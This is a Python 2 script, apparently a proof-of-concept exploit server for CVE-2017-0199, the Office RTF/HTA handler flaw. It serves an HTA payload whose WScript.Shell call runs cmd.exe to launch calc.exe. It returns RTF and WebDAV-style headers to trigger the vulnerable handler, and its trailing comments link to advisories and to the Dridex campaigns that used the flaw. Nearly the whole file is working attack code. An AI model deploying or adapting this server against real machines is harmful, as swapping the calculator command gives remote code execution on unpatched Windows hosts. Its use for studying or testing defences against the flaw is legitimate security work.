#!/usr/bin/python
# -*- coding: utf-8 -*-

from BaseHTTPServer import BaseHTTPRequestHandler
from BaseHTTPServer import HTTPServer

PORT_NUMBER = 80


class hta_server(BaseHTTPRequestHandler):
    payload = (
        "<script>"
        "a=new ActiveXObject('WScript.Shell');"
        "a.run('%windir%\\System32\\cmd.exe /c calc.exe', 0);window.close();"
        "</script>"
    )

    # Handler for the GET requests
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/hta')
        self.end_headers()
        self.wfile.write(self.payload)
        return

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/rtf')
        self.send_header('Accept-Ranges', 'bytes')
        self.send_header('Content-Length', len(self.payload))
        self.end_headers()
        return

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        return

    def do_PROPFIND(self):
        data = (
            '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">'
            '<html><head>'
            '<title>405 Method Not Allowed</title>'
            '</head><body>'
            '<h1>Method Not Allowed</h1>'
            '<p>The requested method PROPFIND is not allowed for the URL /index.html.</p>'
            '<hr>'
            '</body></html>'
        )
        self.send_response(405)
        self.send_header('Allow', 'HEAD,HEAD,GET,HEAD,POST,OPTIONS')
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        return


if __name__ == '__main__':
    try:
        # Create a web server and define the handler to manage the
        # incoming request
        server = HTTPServer(('', PORT_NUMBER), hta_server)
        print 'Started httpserver on port:', PORT_NUMBER

        # Wait forever for incoming htto requests
        server.serve_forever()

    except KeyboardInterrupt:
        print '^C received, shutting down the web server'
        server.socket.close()


# http://www.securityfocus.com/bid/97498/discuss
# https://www.fireeye.com/blog/threat-research/2017/04/acknowledgement_ofa.html
# https://www.blackhat.com/docs/us-15/materials/us-15-Li-Attacking-Interoperability-An-OLE-Edition.pdf
# https://securingtomorrow.mcafee.com/mcafee-labs/critical-office-zero-day-attacks-detected-wild/
# https://github.com/rapid7/metasploit-framework/issues/8220
# http://thehackernews.com/2017/04/microsoft-word-dridex-trojan.html
# https://www.proofpoint.com/us/threat-insight/post/dridex-campaigns-millions-recipients-unpatched-microsoft-zero-day
# https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html
